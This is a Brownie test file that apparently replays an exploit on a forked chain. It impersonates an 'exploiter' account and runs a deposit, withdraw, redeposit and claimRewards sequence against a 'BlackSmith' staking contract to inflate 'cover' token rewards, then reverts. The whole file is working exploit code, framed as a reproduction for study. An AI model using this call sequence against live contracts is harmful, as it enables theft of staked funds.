import pytest
import brownie
from brownie import Wei


def test_exploit(chain, interface, accounts, Contract):
    bs = interface.IBlackSmith('0xe0b94a7bb45dd905c79bb1992c9879f40f1caed5')
    exploiter = accounts.at("0x00007569643bc1709561ec2e86f385df3759e5dd", force=True)
    bptBasisAddress = '0x59686E01Aa841f622a43688153062C2f24F8fDed'
    cover = Contract.from_explorer('0x5d8d9f5b96f4438195be9b99eee6118ed4304286')
    
    chain.snapshot()
    
    amount = 15255552810089260015362
    bs.deposit(bptBasisAddress, amount, {"from": exploiter})
    bs.withdraw(bptBasisAddress, amount-1, {"from": exploiter})
    bs.deposit(bptBasisAddress, amount-1, {"from": exploiter})
    bs.claimRewards(bptBasisAddress, {"from": exploiter})

    print (cover.balanceOf(exploiter))

    chain.revert()
